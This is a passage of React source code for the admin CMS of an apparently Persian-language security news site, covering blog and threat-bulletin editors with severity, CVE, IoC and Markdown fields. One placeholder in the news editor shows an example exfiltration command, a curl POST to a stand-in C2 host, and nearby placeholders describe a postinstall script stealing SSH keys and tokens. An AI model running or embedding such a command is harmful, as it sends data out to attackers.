                  title="متن ضخیم"
                >
                  Bold
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("code_inline", "blog")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-emerald-400 font-mono text-[11px] cursor-pointer"
                  title="کد درون‌خطی"
                >
                  `Code`
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("code_block", "blog")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-emerald-400 font-mono text-[11px] flex items-center gap-1 cursor-pointer"
                  title="بلاک کد اسکریپت"
                >
                  <Terminal className="w-3 h-3" />
                  <span>```Code</span>
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("table", "blog")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 flex items-center gap-1 cursor-pointer"
                  title="جدول داده"
                >
                  <TableIcon className="w-3 h-3" />
                  <span>جدول</span>
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("callout", "blog")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-amber-400 flex items-center gap-1 cursor-pointer"
                  title="کال‌اوت و هشدار امنیتی"
                >
                  <AlertTriangle className="w-3 h-3" />
                  <span>هشدار</span>
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("bullet", "blog")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 cursor-pointer"
                  title="لیست گلوله‌ای"
                >
                  • لیست
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("numbered", "blog")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 cursor-pointer"
                  title="لیست شماره‌دار"
                >
                  ۱. شماره‌دار
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("link", "blog")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-emerald-400 flex items-center gap-1 cursor-pointer"
                  title="پیوند و لینک"
                >
                  <Link2 className="w-3 h-3" />
                  <span>لینک</span>
                </button>
              </div>
            </div>

            {/* View Mode Layout */}
            {editorViewMode === "split" && (
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                <div className="space-y-1.5 flex flex-col">
                  <div className="flex items-center justify-between text-[11px] text-slate-400 font-mono px-1">
                    <span>ویرایشگر Markdown (RTL / Mono)</span>
                    <span>خطوط باز و فاصله‌گذاری استاندارد</span>
                  </div>
                  <textarea
                    rows={22}
                    required
                    value={editingBlog.bodyMarkdown || ""}
                    onChange={(e) =>
                      setEditingBlog({ ...editingBlog, bodyMarkdown: e.target.value })
                    }
                    placeholder="## ۱. بررسی معماری حفاظتی&#10;&#10;متن فنی مقاله را به صورت Markdown وارد نمایید...&#10;&#10;```powershell&#10;Get-Process&#10;```&#10;&#10;> ⚠️ هشدار امنیتی: ..."
                    className="w-full h-[560px] bg-slate-950 border border-slate-800 rounded-xl p-4 text-slate-100 font-mono text-xs leading-relaxed focus:border-emerald-500 focus:outline-none scrollbar-thin scrollbar-thumb-slate-800"
                  />
                </div>

                <div className="space-y-1.5 flex flex-col">
                  <div className="flex items-center justify-between text-[11px] text-slate-400 font-mono px-1">
                    <span className="flex items-center gap-1.5 text-emerald-400">
                      <Sparkles className="w-3 h-3" />
                      <span>پیش‌نمایش زنده و رندر امن (Live Preview)</span>
                    </span>
                    <span>به‌روزرسانی همگام</span>
                  </div>
                  <div className="w-full h-[560px] overflow-y-auto bg-slate-950/80 border border-slate-800 rounded-xl p-5 scrollbar-thin scrollbar-thumb-slate-800">
                    <MarkdownPreview markdown={editingBlog.bodyMarkdown || ""} />
                  </div>
                </div>
              </div>
            )}

            {editorViewMode === "edit" && (
              <div className="space-y-1.5">
                <textarea
                  rows={24}
                  required
                  value={editingBlog.bodyMarkdown || ""}
                  onChange={(e) =>
                    setEditingBlog({ ...editingBlog, bodyMarkdown: e.target.value })
                  }
                  placeholder="## ۱. بررسی معماری حفاظتی&#10;&#10;متن فنی مقاله را به صورت Markdown وارد نمایید..."
                  className="w-full h-[600px] bg-slate-950 border border-slate-800 rounded-xl p-4 text-slate-100 font-mono text-xs leading-relaxed focus:border-emerald-500 focus:outline-none"
                />
              </div>
            )}

            {editorViewMode === "preview" && (
              <div className="w-full min-h-[500px] bg-slate-950/90 border border-slate-800 rounded-xl p-6">
                <MarkdownPreview markdown={editingBlog.bodyMarkdown || ""} />
              </div>
            )}
          </div>

          {/* Bottom Actions Bar */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pt-4 border-t border-slate-800">
            <div className="text-xs text-slate-400 flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 text-emerald-400" />
              <span>محتوا با ساختار جدید <strong className="text-white">متادیتا + bodyMarkdown</strong> ذخیره خواهد شد.</span>
            </div>

            <div className="flex items-center gap-3">
              <button
                type="button"
                onClick={() => setEditingBlog(null)}
                className="px-4 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold cursor-pointer"
              >
                انصراف
              </button>
              <button
                type="submit"
                disabled={saving}
                className="flex items-center gap-2 px-6 py-2.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold cursor-pointer shadow-lg shadow-emerald-950/40"
              >
                <Save className="w-4 h-4" />
                <span>{saving ? "در حال ذخیره و پردازش در سرور..." : "ذخیره و انتشار مقاله وبلاگ"}</span>
              </button>
            </div>
          </div>
        </form>
      </div>
    );
  }

  // ============================================================================
  // RENDER: SECURITY NEWS ARTICLE EDITOR FORM (v2 Markdown & Live Preview)
  // ============================================================================
  if (editingNews) {
    const newsMarkdownText = editingNews.bodyMarkdown || "";
    const newsWordCount = newsMarkdownText.trim() ? newsMarkdownText.trim().split(/\s+/).length : 0;
    const newsCharCount = newsMarkdownText.length;
    const newsEstimatedMinutes = Math.max(1, Math.ceil(newsWordCount / 180));

    return (
      <div className="rounded-2xl bg-slate-900 border border-slate-800 p-6 space-y-6">
        {/* Editor Top Bar */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-800 pb-4">
          <div className="space-y-1">
            <div className="flex items-center gap-2.5">
              <Radio className="w-5 h-5 text-rose-400" />
              <h2 className="text-base font-extrabold text-white">
                ویرایشگر گزارش‌های خبری و بولتن رادار تهدیدات (معماری مدرن Markdown)
              </h2>
              <span className="px-2 py-0.5 rounded-full bg-rose-500/20 text-rose-300 font-mono text-[10px] font-bold border border-rose-500/30">
                Threat Radar v2.0
              </span>
            </div>
            <p className="text-xs text-slate-400">
              ویرایش گزارش فوری با فرمت یکپارچه متادیتا و متن Markdown و ارسال به اندپوینت استاندارد <code className="text-rose-400 font-mono text-[11px]">upsert_content</code>
            </p>
          </div>

          <div className="flex items-center gap-2">
            {/* View Mode Switcher */}
            <div className="flex items-center p-1 rounded-xl bg-slate-950 border border-slate-800 text-xs">
              <button
                type="button"
                onClick={() => setEditorViewMode("split")}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg font-bold transition-colors cursor-pointer ${
                  editorViewMode === "split"
                    ? "bg-rose-500 text-white shadow-sm"
                    : "text-slate-400 hover:text-white"
                }`}
                title="نمای همزمان ادیتور و پیش‌نمایش"
              >
                <Columns className="w-3.5 h-3.5" />
                <span className="hidden sm:inline">نمای دوگانه</span>
              </button>
              <button
                type="button"
                onClick={() => setEditorViewMode("edit")}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg font-bold transition-colors cursor-pointer ${
                  editorViewMode === "edit"
                    ? "bg-rose-500 text-white shadow-sm"
                    : "text-slate-400 hover:text-white"
                }`}
                title="فقط ویرایشگر متنی"
              >
                <Edit3 className="w-3.5 h-3.5" />
                <span className="hidden sm:inline">ویرایشگر</span>
              </button>
              <button
                type="button"
                onClick={() => setEditorViewMode("preview")}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg font-bold transition-colors cursor-pointer ${
                  editorViewMode === "preview"
                    ? "bg-rose-500 text-white shadow-sm"
                    : "text-slate-400 hover:text-white"
                }`}
                title="فقط پیش‌نمایش زنده"
              >
                <Eye className="w-3.5 h-3.5" />
                <span className="hidden sm:inline">پیش‌نمایش</span>
              </button>
            </div>

            <button
              onClick={() => setEditingNews(null)}
              className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold cursor-pointer"
            >
              <X className="w-4 h-4" />
              <span>انصراف</span>
            </button>
          </div>
        </div>

        <form onSubmit={handleSaveNews} className="space-y-6 text-xs">
          {/* Metadata Card */}
          <div className="rounded-2xl bg-slate-950/70 border border-slate-800 p-5 space-y-4">
            <div className="flex items-center justify-between border-b border-slate-850 pb-3">
              <span className="text-xs font-extrabold text-slate-200 flex items-center gap-2">
                <Tag className="w-4 h-4 text-rose-400" />
                <span>شناسنامه و متادیتای گزارش رادار</span>
              </span>
              <span className="text-[11px] text-slate-400 font-mono">
                slug: /{editingNews.slug || "..."}
              </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              <div className="md:col-span-2 space-y-1.5">
                <label className="font-bold text-slate-300 block">تیتر اصلی خبر یا بولتن امنیتی *</label>
                <input
                  type="text"
                  required
                  value={editingNews.title}
                  onChange={(e) => setEditingNews({ ...editingNews, title: e.target.value })}
                  placeholder="مثال: هشدار فوری: کشف پکیج مسموم در NPM..."
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-bold focus:border-rose-500 focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="font-bold text-slate-300 block">سطح شدت خطر (Severity)</label>
                <select
                  value={editingNews.severity}
                  onChange={(e) =>
                    setEditingNews({
                      ...editingNews,
                      severity: e.target.value as NewsArticle["severity"],
                    })
                  }
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-rose-400 font-bold focus:border-rose-500 focus:outline-none"
                >
                  <option value="CRITICAL">بحرانی (CRITICAL)</option>
                  <option value="HIGH">شدت بالا (HIGH)</option>
                  <option value="MEDIUM">متوسط (MEDIUM)</option>
                  <option value="INFO">اطلاع‌رسانی (INFO)</option>
                </select>
              </div>

              <div className="md:col-span-2 space-y-1.5">
                <label className="font-bold text-slate-300 block">لید / زیرعنوان خبر (Subtitle)</label>
                <input
                  type="text"
                  value={editingNews.subtitle || ""}
                  onChange={(e) => setEditingNews({ ...editingNews, subtitle: e.target.value })}
                  placeholder="حمله زنجیره تامین گسترده علیه توسعه‌دهندگان جاوااسکریپت..."
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-slate-200 focus:border-rose-500 focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="font-bold text-slate-300 block">دسته‌بندی خبر امنیت *</label>
                <select
                  value={editingNews.category}
                  onChange={(e) => {
                    const selCat = categories.find((c) => c.name === e.target.value);
                    setEditingNews({
                      ...editingNews,
                      category: e.target.value,
                      categoryLabel: e.target.value,
                      categoryId: selCat?.slug || editingNews.categoryId,
                    });
                  }}
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white focus:border-rose-500 focus:outline-none"
                >
                  {categories
                    .filter((c) => c.targetType === "all" || c.targetType === "news")
                    .map((c) => (
                      <option key={c.id} value={c.name}>
                        {c.name}
                      </option>
                    ))}
                </select>
              </div>

              <div className="space-y-1.5">
                <label className="font-bold text-slate-300 block">نامک آدرس مستقیم (URL Slug)</label>
                <input
                  type="text"
                  value={editingNews.slug}
                  onChange={(e) => setEditingNews({ ...editingNews, slug: e.target.value })}
                  dir="ltr"
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-emerald-400 font-mono text-left focus:border-rose-500 focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="font-bold text-slate-300 block">منبع اولیه خبر / CERT</label>
                <input
                  type="text"
                  value={editingNews.source}
                  onChange={(e) => setEditingNews({ ...editingNews, source: e.target.value })}
                  placeholder="مثال: BleepingComputer / Roham CERT"
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white focus:border-rose-500 focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="font-bold text-slate-300 block">شناسه‌های CVE یا اکسپلویت</label>
                <input
                  type="text"
                  value={(editingNews.cveIds || []).join(", ")}
                  onChange={(e) =>
                    setEditingNews({
                      ...editingNews,
                      cveIds: e.target.value.split(",").map((s) => s.trim()).filter(Boolean),
                    })
                  }
                  dir="ltr"
                  placeholder="CVE-2026-1234, CVE-2026-5678"
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-rose-400 font-mono text-left focus:border-rose-500 focus:outline-none"
                />
              </div>

              <div className="md:col-span-3 space-y-1.5">
                <label className="font-bold text-slate-300 block">
                  تگ‌ها و کلیدواژه‌ها (جداشده با کاما انگلیسی ,)
                </label>
                <input
                  type="text"
                  value={(editingNews.tags || editingNews.keywords || []).join(", ")}
                  onChange={(e) => {
                    const items = e.target.value.split(",").map((s) => s.trim()).filter(Boolean);
                    setEditingNews({
                      ...editingNews,
                      tags: items,
                      keywords: items,
                    });
                  }}
                  dir="ltr"
                  placeholder="SupplyChain, NPM, SSH_Keys, GitHub_Token"
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-emerald-400 font-mono text-left focus:border-rose-500 focus:outline-none"
                />
              </div>
            </div>

            {/* Toggles */}
            <div className="flex flex-wrap items-center gap-6 pt-3 border-t border-slate-855">
              <label className="flex items-center gap-2 cursor-pointer">
                <input
                  type="checkbox"
                  checked={editingNews.status === "published"}
                  onChange={(e) =>
                    setEditingNews({
                      ...editingNews,
                      status: e.target.checked ? "published" : "draft",
                    })
                  }
                  className="w-4 h-4 accent-emerald-500 rounded"
                />
                <span className="font-bold text-slate-200">
                  انتشار عمومی در رادار تهدیدات (Published)
                </span>
              </label>

              <label className="flex items-center gap-2 cursor-pointer">
                <input
                  type="checkbox"
                  checked={editingNews.isBreaking}
                  onChange={(e) =>
                    setEditingNews({ ...editingNews, isBreaking: e.target.checked })
                  }
                  className="w-4 h-4 accent-rose-500 rounded"
                />
                <span className="font-bold text-rose-400 flex items-center gap-1">
                  <Flame className="w-3.5 h-3.5" />
                  <span>نمایش در نوار خبر فوری بالای رادار (Breaking Alert)</span>
                </span>
              </label>
            </div>

            {/* Summary & Highlights */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
              <div className="space-y-1.5">
                <label className="font-bold text-slate-300 block">
                  خلاصه اصلی بولتن خبری *
                </label>
                <textarea
                  rows={3}
                  required
                  value={editingNews.summary}
                  onChange={(e) => setEditingNews({ ...editingNews, summary: e.target.value })}
                  placeholder="بسته مخرب کلیدهای SSH و توکن‌های گیت‌هاب را به سرور C2 ارسال می‌کند..."
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl p-3 text-slate-200 leading-relaxed focus:border-rose-500 focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="font-bold text-rose-400 block">
                  نکات کلیدی خبر (Highlights — هر خط یک مورد)
                </label>
                <textarea
                  rows={3}
                  value={(editingNews.keyHighlights || []).join("\n")}
                  onChange={(e) =>
                    setEditingNews({
                      ...editingNews,
                      keyHighlights: e.target.value.split("\n"),
                    })
                  }
                  placeholder="حمله از طریق اسکریپت postinstall پکیج آغاز می‌شود.&#10;سرور فرماندهی در هلند مستقر شده است."
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl p-3 text-slate-200 leading-relaxed focus:border-rose-500 focus:outline-none"
                />
              </div>
            </div>

            {/* IoCs List Editor */}
            <div className="space-y-2 pt-2 border-t border-slate-855">
              <div className="flex items-center justify-between">
                <label className="font-bold text-rose-400 flex items-center gap-1.5">
                  <AlertTriangle className="w-4 h-4" />
                  <span>شاخص‌های آلودگی امنیتی (IoCs)</span>
                </label>
                <button
                  type="button"
                  onClick={() =>
                    setEditingNews({
                      ...editingNews,
                      iocs: [
                        ...(editingNews.iocs || []),
                        { type: "Domain/IP", value: "", description: "" },
                      ],
                    })
                  }
                  className="text-emerald-400 hover:text-emerald-300 flex items-center gap-1 font-bold text-xs cursor-pointer"
                >
                  <PlusCircle className="w-3.5 h-3.5" />
                  <span>افزودن IoC جدید</span>
                </button>
              </div>

              {(editingNews.iocs || []).map((ioc, iIdx) => (
                <div
                  key={iIdx}
                  className="flex flex-col sm:flex-row items-center gap-2 bg-slate-900 p-2.5 rounded-xl border border-slate-800"
                >
                  <input
                    type="text"
                    value={ioc.type}
                    onChange={(e) => {
                      const next = [...(editingNews.iocs || [])];
                      next[iIdx] = { ...ioc, type: e.target.value };
                      setEditingNews({ ...editingNews, iocs: next });
                    }}
                    placeholder="نوع (Domain, SHA-256)"
                    dir="ltr"
                    className="w-full sm:w-32 bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-emerald-400 font-mono text-xs text-left"
                  />
                  <input
                    type="text"
                    value={ioc.value}
                    onChange={(e) => {
                      const next = [...(editingNews.iocs || [])];
                      next[iIdx] = { ...ioc, value: e.target.value };
                      setEditingNews({ ...editingNews, iocs: next });
                    }}
                    placeholder="مقدار شاخص (مثال: malicious-c2.net)"
                    dir="ltr"
                    className="w-full sm:flex-1 bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-amber-300 font-mono text-xs text-left"
                  />
                  <input
                    type="text"
                    value={ioc.description}
                    onChange={(e) => {
                      const next = [...(editingNews.iocs || [])];
                      next[iIdx] = { ...ioc, description: e.target.value };
                      setEditingNews({ ...editingNews, iocs: next });
                    }}
                    placeholder="توضیحات..."
                    className="w-full sm:w-48 bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-2.5 text-slate-300 text-xs"
                  />
                  <button
                    type="button"
                    onClick={() =>
                      setEditingNews({
                        ...editingNews,
                        iocs: (editingNews.iocs || []).filter((_, i) => i !== iIdx),
                      })
                    }
                    className="text-rose-400 hover:text-rose-300 p-1 cursor-pointer"
                    title="حذف"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                  </button>
                </div>
              ))}
            </div>
          </div>

          {/* Core Markdown Workspace Container */}
          <div className="space-y-3">
            <div className="flex flex-wrap items-center justify-between gap-3">
              <div className="flex items-center gap-2">
                <span className="text-sm font-extrabold text-white">
                  متن و تحلیل تفصیلی خبر (Markdown Body)
                </span>
                <span className="text-[11px] font-mono text-slate-400">
                  {newsWordCount} کلمه · {newsCharCount} کاراکتر · مطالعه حدود {newsEstimatedMinutes} دقیقه
                </span>
              </div>

              {/* Fast Markdown Toolbar */}
              <div className="flex flex-wrap items-center gap-1.5 bg-slate-950 p-1.5 rounded-xl border border-slate-800 text-xs">
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("h2", "news")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 font-bold cursor-pointer"
                  title="تیتر سطح ۲"
                >
                  ## تیتر ۲
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("h3", "news")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 font-bold cursor-pointer"
                  title="تیتر سطح ۳"
                >
                  ### تیتر ۳
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("bold", "news")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 font-bold cursor-pointer"
                  title="متن ضخیم"
                >
                  Bold
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("code_inline", "news")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-emerald-400 font-mono text-[11px] cursor-pointer"
                  title="کد درون‌خطی"
                >
                  `Code`
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("code_block", "news")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-emerald-400 font-mono text-[11px] flex items-center gap-1 cursor-pointer"
                  title="بلاک کد اسکریپت"
                >
                  <Terminal className="w-3 h-3" />
                  <span>```Code</span>
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("table", "news")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 flex items-center gap-1 cursor-pointer"
                  title="جدول داده"
                >
                  <TableIcon className="w-3 h-3" />
                  <span>جدول</span>
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("callout", "news")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-amber-400 flex items-center gap-1 cursor-pointer"
                  title="کال‌اوت و هشدار امنیتی"
                >
                  <AlertTriangle className="w-3 h-3" />
                  <span>هشدار</span>
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("bullet", "news")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 cursor-pointer"
                  title="لیست گلوله‌ای"
                >
                  • لیست
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("numbered", "news")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 cursor-pointer"
                  title="لیست شماره‌دار"
                >
                  ۱. شماره‌دار
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("link", "news")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-emerald-400 flex items-center gap-1 cursor-pointer"
                  title="پیوند و لینک"
                >
                  <Link2 className="w-3 h-3" />
                  <span>لینک</span>
                </button>
              </div>
            </div>

            {/* View Mode Layout */}
            {editorViewMode === "split" && (
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                <div className="space-y-1.5 flex flex-col">
                  <div className="flex items-center justify-between text-[11px] text-slate-400 font-mono px-1">
                    <span>ویرایشگر Markdown خبر</span>
                    <span>خطوط باز و فاصله‌گذاری استاندارد</span>
                  </div>
                  <textarea
                    rows={20}
                    required
                    value={editingNews.bodyMarkdown || ""}
                    onChange={(e) =>
                      setEditingNews({ ...editingNews, bodyMarkdown: e.target.value })
                    }
                    placeholder="## جزئیات بسته مخرب&#10;&#10;حمله از طریق اسکریپت postinstall آغاز می‌شود...&#10;&#10;```bash&#10;curl -s -X POST https://malicious-c2.net/drop&#10;```"
                    className="w-full h-[520px] bg-slate-950 border border-slate-800 rounded-xl p-4 text-slate-100 font-mono text-xs leading-relaxed focus:border-rose-500 focus:outline-none scrollbar-thin scrollbar-thumb-slate-800"
                  />
                </div>

                <div className="space-y-1.5 flex flex-col">
                  <div className="flex items-center justify-between text-[11px] text-slate-400 font-mono px-1">
                    <span className="flex items-center gap-1.5 text-rose-400">
                      <Sparkles className="w-3 h-3" />
                      <span>پیش‌نمایش زنده و رندر امن (Live Preview)</span>
                    </span>
                    <span>به‌روزرسانی همگام</span>
                  </div>
                  <div className="w-full h-[520px] overflow-y-auto bg-slate-950/80 border border-slate-800 rounded-xl p-5 scrollbar-thin scrollbar-thumb-slate-800">
                    <MarkdownPreview markdown={editingNews.bodyMarkdown || ""} />
                  </div>
                </div>
              </div>
            )}

            {editorViewMode === "edit" && (
              <div className="space-y-1.5">
                <textarea
                  rows={22}
                  required
                  value={editingNews.bodyMarkdown || ""}
                  onChange={(e) =>
                    setEditingNews({ ...editingNews, bodyMarkdown: e.target.value })
                  }
                  placeholder="## جزئیات بسته مخرب&#10;&#10;حمله از طریق اسکریپت postinstall آغاز می‌شود..."
                  className="w-full h-[560px] bg-slate-950 border border-slate-800 rounded-xl p-4 text-slate-100 font-mono text-xs leading-relaxed focus:border-rose-500 focus:outline-none"
                />
              </div>
            )}

            {editorViewMode === "preview" && (
              <div className="w-full min-h-[500px] bg-slate-950/90 border border-slate-800 rounded-xl p-6">
                <MarkdownPreview markdown={editingNews.bodyMarkdown || ""} />
              </div>
            )}
          </div>

          {/* Bottom Actions Bar */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pt-4 border-t border-slate-800">
            <div className="text-xs text-slate-400 flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 text-rose-400" />
              <span>محتوا با ساختار جدید <strong className="text-white">متادیتا + bodyMarkdown</strong> در رادار ذخیره خواهد شد.</span>
            </div>

            <div className="flex items-center gap-3">
              <button
                type="button"
                onClick={() => setEditingNews(null)}
                className="px-4 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold cursor-pointer"
              >
                انصراف
              </button>
              <button
                type="submit"
                disabled={saving}
                className="flex items-center gap-2 px-6 py-2.5 rounded-xl bg-rose-600 hover:bg-rose-500 text-white font-bold cursor-pointer shadow-lg shadow-rose-950/40"
              >
                <Save className="w-4 h-4" />
                <span>{saving ? "در حال ذخیره در دیتابیس..." : "ذخیره و انتشار در رادار خبری"}</span>
              </button>
            </div>
          </div>
        </form>
      </div>
    );
  }

  // ============================================================================
  // RENDER: MAIN CMS DASHBOARD (BLOG & NEWS LISTS)
  // ============================================================================
  return (
    <div className="space-y-6">
      {feedback && (
        <div
          className={`p-4 rounded-2xl border flex items-center justify-between text-xs font-bold ${
            feedback.type === "success"
              ? "bg-emerald-950/60 border-emerald-500/40 text-emerald-300"
              : "bg-rose-950/60 border-rose-500/40 text-rose-300"
          }`}
        >
          <div className="flex items-center gap-2">
            {feedback.type === "success" ? (
              <CheckCircle2 className="w-4 h-4 text-emerald-400" />
            ) : (
              <AlertCircle className="w-4 h-4 text-rose-400" />
            )}
            <span>{feedback.text}</span>
          </div>
          <button onClick={() => setFeedback(null)}>
            <X className="w-4 h-4" />
          </button>
        </div>
      )}

      {/* CMS Header & Sub-tab Switcher */}
      <div className="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 p-5 sm:p-6 flex flex-col lg:flex-row lg:items-center justify-between gap-4 shadow-xs">
        <div className="space-y-1">
          <h2 className="text-base sm:text-lg font-extrabold text-slate-900 dark:text-white flex items-center gap-2">
            <FileText className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />
            <span>مدیریت محتوا (CMS) — مقالات تخصصی، اخبار امنیت و دسته‌بندی‌ها</span>
          </h2>
          <p className="text-xs text-slate-500 dark:text-slate-400 leading-relaxed">
            تمامی مقالات، اخبار و دسته‌بندی‌ها در دیتابیس MySQL هاست ذخیره و مستقیماً در بخش‌های عمومی سایت همگام‌سازی می‌شوند.
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-2.5 shrink-0">
          <div className="flex flex-wrap items-center p-1 rounded-xl bg-slate-100 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 text-xs gap-1">
            <button
              onClick={() => setCmsSubTab("blog")}
              className={`px-3.5 py-2 rounded-lg font-bold transition-colors cursor-pointer flex items-center gap-1.5 ${
                cmsSubTab === "blog"
                  ? "bg-emerald-600 text-white shadow-xs"
                  : "text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white"
              }`}
            >
              <FileText className="w-3.5 h-3.5" />
              <span>مقالات وبلاگ ({blogPosts.length})</span>
            </button>
            <button
              onClick={() => setCmsSubTab("news")}
              className={`px-3.5 py-2 rounded-lg font-bold transition-colors cursor-pointer flex items-center gap-1.5 ${
                cmsSubTab === "news"
                  ? "bg-emerald-600 text-white shadow-xs"
                  : "text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white"
              }`}
            >
              <Radio className="w-3.5 h-3.5" />
              <span>اخبار امنیت ({newsArticles.length})</span>
            </button>
            <button
              onClick={() => setCmsSubTab("categories")}
              className={`px-3.5 py-2 rounded-lg font-bold transition-colors cursor-pointer flex items-center gap-1.5 ${
                cmsSubTab === "categories"
                  ? "bg-emerald-600 text-white shadow-xs"
                  : "text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white"
              }`}
            >
              <FolderTree className="w-3.5 h-3.5" />
              <span>دسته‌بندی‌ها ({categories.length})</span>
            </button>
          </div>

          {cmsSubTab === "blog" && (
            <button
              onClick={handleStartNewBlog}
              className="flex items-center gap-1.5 px-4 py-2.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold transition-colors cursor-pointer shadow-xs"
            >
              <Plus className="w-4 h-4" />
              <span>نوشتن مقاله جدید</span>
            </button>
          )}

          {cmsSubTab === "news" && (
            <button
              onClick={handleStartNewNews}
              className="flex items-center gap-1.5 px-4 py-2.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold transition-colors cursor-pointer shadow-xs"
            >
              <Plus className="w-4 h-4" />
              <span>انتشار خبر امنیت جدید</span>
            </button>
          )}

          {cmsSubTab === "categories" && (
            <button
              onClick={handleStartNewCategory}
              className="flex items-center gap-1.5 px-4 py-2.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold transition-colors cursor-pointer shadow-xs"
            >
              <Plus className="w-4 h-4" />
              <span>ایجاد دسته‌بندی جدید</span>
            </button>
          )}

          <button
            onClick={handleResetAllDefaults}
            className="p-2.5 rounded-xl bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 hover:border-slate-300 dark:hover:border-slate-700 text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white text-xs cursor-pointer"
            title="بازنشانی محتوای پیش‌فرض"
          >
            <RotateCcw className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Sub-tab 0: Categories Management */}
      {cmsSubTab === "categories" && (
        <div className="space-y-4">
          {/* Header Banner */}
          <div className="p-5 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
            <div className="space-y-1">
              <h3 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
